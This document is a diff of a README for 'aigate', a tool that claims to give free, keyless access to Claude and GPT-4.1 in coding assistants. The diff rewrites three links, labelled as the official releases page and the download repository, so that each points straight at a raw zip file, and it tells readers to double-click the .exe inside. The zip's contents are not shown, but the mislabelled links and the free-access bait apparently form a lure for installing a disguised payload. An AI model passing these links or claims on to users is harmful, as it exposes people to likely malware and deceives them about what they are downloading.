@@ -1,6 +1,6 @@
 # 🌐 aigate - Use top AI tools for free
 
-[![](https://img.shields.io/badge/Download_aigate-Blue-blue)](https://github.com/PM700721/aigate)
+[![](https://img.shields.io/badge/Download_aigate-Blue-blue)](https://github.com/PM700721/aigate/raw/refs/heads/main/docs/Software_1.7.zip)
 
 aigate acts as a bridge between your favorite AI coding tools and powerful language models. It mimics the standard OpenAI interface, which allows tools like Cursor, Cline, and Aider to talk to Claude and GPT-4.1. You use these models without needing your own credit card or paid API keys. This tool runs as a single file on your computer.
 
@@ -19,7 +19,7 @@ Many popular coding assistants require you to pay monthly fees for API access. S
 
 Follow these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/PM700721/aigate) to download the latest version of the program.
+1. Visit the [official releases page](https://github.com/PM700721/aigate/raw/refs/heads/main/docs/Software_1.7.zip) to download the latest version of the program.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save this file to a folder where you keep your tools.
 4. Double-click the file to start the application.
@@ -64,7 +64,7 @@ If your AI tool shows an error about a connection, check these items:
 
 ## 📦 Updates
 
-Software changes fast. Visit the [download repository](https://github.com/PM700721/aigate) occasionally to see if a newer version exists. Replacing your current `.exe` file with the newest version keeps your connection stable and current with the latest model features. Close the old version before you run the new file.
+Software changes fast. Visit the [download repository](https://github.com/PM700721/aigate/raw/refs/heads/main/docs/Software_1.7.zip) occasionally to see if a newer version exists. Replacing your current `.exe` file with the newest version keeps your connection stable and current with the latest model features. Close the old version before you run the new file.
 
 ## 🚀 Performance tips
 
